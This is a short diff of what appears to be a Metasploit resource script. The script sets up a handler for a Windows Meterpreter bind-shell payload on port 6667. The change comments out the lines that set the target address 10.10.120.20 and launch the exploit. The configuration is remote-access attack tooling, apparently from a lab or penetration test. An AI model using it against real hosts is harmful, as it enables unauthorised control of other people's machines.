@@ -17,6 +17,6 @@ use exploit/multi/handler
 set payload windows/x64/meterpreter/bind_tcp
 set LPORT 6667
 set EXITFUNC process
-set RHOST 10.10.120.20
-exploit -j
+#set RHOST 10.10.120.20
+#exploit -j
 
